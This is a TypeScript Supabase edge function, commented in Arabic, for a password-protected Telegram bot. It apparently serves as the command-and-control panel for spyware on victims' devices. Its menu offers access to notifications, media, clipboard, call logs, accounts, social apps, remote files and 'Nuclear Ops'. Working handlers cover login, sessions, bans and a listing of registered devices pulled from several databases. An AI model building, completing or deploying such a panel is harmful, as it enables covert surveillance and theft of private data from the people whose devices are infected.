// supabase/functions/telegram-bot/index.ts
import { serve } from "https://deno.land/std@0.131.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

// ============================================================
// قراءة المتغيرات من البيئة (باستخدام أسماء DB_ بدلاً من SUPABASE_)
// ============================================================
const BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN") || "";
const MASTER_PASSWORD = Deno.env.get("MASTER_PASSWORD") || "";
const PROJECTS: any[] = [];

for (let i = 1; i <= 4; i++) {
  const url = Deno.env.get(`DB_URL_${i}`);
  const key = Deno.env.get(`DB_KEY_${i}`);
  if (url && key) {
    PROJECTS.push({
      id: i,
      client: createClient(url, key, { auth: { persistSession: false } }),
    });
  }
}

// ============================================================
// دوال مساعدة
// ============================================================
async function sendTelegram(method: string, payload: any) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  const resp = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
  return resp;
}

async function updateSession(chatId: number) {
  if (PROJECTS.length > 0) {
    await PROJECTS[0].client
      .from("sessions")
      .upsert({ chat_id: chatId, last_activity: new Date().toISOString() });
  }
}

async function isSessionValid(chatId: number): Promise<boolean> {
  if (PROJECTS.length === 0) return false;
  const { data } = await PROJECTS[0].client
    .from("sessions")
    .select("last_activity")
    .eq("chat_id", chatId)
    .maybeSingle();
  if (!data) return false;
  const last = new Date(data.last_activity).getTime();
  const now = Date.now();
  return now - last < 5 * 60 * 1000; // 5 دقائق
}

async function isBanned(chatId: number): Promise<boolean> {
  if (PROJECTS.length === 0) return false;
  const { data } = await PROJECTS[0].client
    .from("banned_chats")
    .select("chat_id")
    .eq("chat_id", chatId)
    .maybeSingle();
  return !!data;
}

async function fetchCombined(table: string, limit = 10) {
  const promises = PROJECTS.map((p) =>
    p.client.from(table).select("*").order("created_at", { ascending: false }).limit(limit)
  );
  const results = await Promise.allSettled(promises);
  const data: any[] = [];
  for (const res of results) {
    if (res.status === "fulfilled" && res.value.data) {
      data.push(...res.value.data);
    }
  }
  return data.sort((a, b) => (a.created_at < b.created_at ? 1 : -1)).slice(0, limit);
}

// ============================================================
// القوائم (بالإنجليزية)
// ============================================================
const MAIN_KEYBOARD = {
  inline_keyboard: [
    [{ text: "📱 Devices", callback_data: "menu_devices" }],
    [{ text: "📩 Notifications", callback_data: "menu_notifs" }],
    [{ text: "📸 Media", callback_data: "menu_media" }],
    [{ text: "📋 Clipboard", callback_data: "menu_clipboard" }],
    [{ text: "📱 Installed Apps", callback_data: "menu_apps" }],
    [{ text: "📱 Social Apps", callback_data: "menu_social" }],
    [{ text: "☢️ Nuclear Ops", callback_data: "menu_nuke" }],
    [{ text: "📂 Remote Files", callback_data: "menu_files" }],
    [{ text: "📞 Call Logs", callback_data: "menu_calllogs" }],
    [{ text: "🔑 Accounts", callback_data: "menu_accounts" }],
    [{ text: "📊 Storage", callback_data: "show_storage" }],
    [{ text: "🚪 Logout", callback_data: "logout" }],
  ],
};

// ============================================================
// نقطة الدخول الرئيسية
// ============================================================
serve(async (req) => {
  const update = await req.json();

  if (update.message) {
    const chatId = update.message.chat.id;
    const text = update.message.text || "";

    if (await isBanned(chatId)) {
      await sendTelegram("sendMessage", { chat_id: chatId, text: "⛔ You are banned." });
      return new Response("ok");
    }

    if (text.startsWith("/login ")) {
      const pass = text.split(" ")[1];
      if (pass === MASTER_PASSWORD) {
        await PROJECTS[0].client
          .from("sessions")
          .upsert({ chat_id: chatId, last_activity: new Date().toISOString() });
        await sendTelegram("sendMessage", {
          chat_id: chatId,
          text: "✅ Login successful. Welcome to the control panel.",
          reply_markup: MAIN_KEYBOARD,
        });
      } else {
        await sendTelegram("sendMessage", { chat_id: chatId, text: "❌ Wrong password." });
      }
      return new Response("ok");
    }

    if (text === "/start") {
      await sendTelegram("sendMessage", {
        chat_id: chatId,
        text: "🔐 Please login using /login <password>",
      });
      return new Response("ok");
    }
  }

  if (update.callback_query) {
    const cb = update.callback_query;
    const chatId = cb.message.chat.id;
    const msgId = cb.message.message_id;
    const data = cb.data;

    await sendTelegram("answerCallbackQuery", { callback_query_id: cb.id });

    if (await isBanned(chatId)) {
      await sendTelegram("sendMessage", { chat_id: chatId, text: "⛔ You are banned." });
      return new Response("ok");
    }
    const valid = await isSessionValid(chatId);
    if (!valid && data !== "login") {
      await sendTelegram("sendMessage", {
        chat_id: chatId,
        text: "⏰ Session expired. Please /login again.",
      });
      return new Response("ok");
    }
    await updateSession(chatId);

    if (data === "logout") {
      await PROJECTS[0].client.from("sessions").delete().eq("chat_id", chatId);
      await sendTelegram("sendMessage", { chat_id: chatId, text: "👋 Logged out." });
      return new Response("ok");
    }

    if (data === "menu_devices") {
      const devices = await fetchCombined("pos_clients", 10);
      let text = "📱 *Registered devices:*\n";
      for (const d of devices) {
        text += `• \`${d.client_serial.slice(0, 8)}…\` | ${d.model_name || "Unknown"}\n`;
      }
      await sendTelegram("editMessageText", {
        chat_id: chatId,
        message_id: msgId,
        text,
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "back_main" }]] },
      });
      return new Response("ok");
    }

    if (data === "back_main") {
      await sendTelegram("editMessageText", {
        chat_id: chatId,
        message_id: msgId,
        text: "🎮 Main menu:",
        reply_markup: MAIN_KEYBOARD,
      });
      return new Response("ok");
    }

    // يمكن إضافة باقي الأزرار بنفس النمط
  }

  return new Response("ok");
});
